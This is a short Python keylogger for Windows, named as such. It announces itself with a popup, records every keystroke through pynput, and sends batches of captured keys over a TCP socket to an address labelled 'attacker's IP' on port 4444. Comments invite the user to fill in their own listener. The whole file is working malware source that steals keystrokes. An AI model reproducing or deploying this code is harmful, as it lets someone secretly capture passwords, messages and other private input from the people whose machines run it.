import pynput.keyboard
import socket
import threading
import time
import ctypes
import datetime

# ✅ Visible popup on execution
message = f"✅ keylogger.py executed at {datetime.datetime.now()}!"
ctypes.windll.user32.MessageBoxW(0, message, "Keylogger Status", 0x40)

# 🔒 Attacker's IP & port
IP = "192.168.0.106"   # <-- Change this to your attacker's IP
PORT = 4444            # Port where your listener is running

log = ""

def send_to_attacker(message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send(message.encode())
        s.close()
    except:
        pass

def process_key(key):
    global log

    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        else:
            log += f" [{key}] "

    if len(log) > 20:
        send_to_attacker(log)
        log = ""

def start_logger():
    with pynput.keyboard.Listener(on_press=process_key) as listener:
        listener.join()

keylogger_thread = threading.Thread(target=start_logger)
keylogger_thread.start()
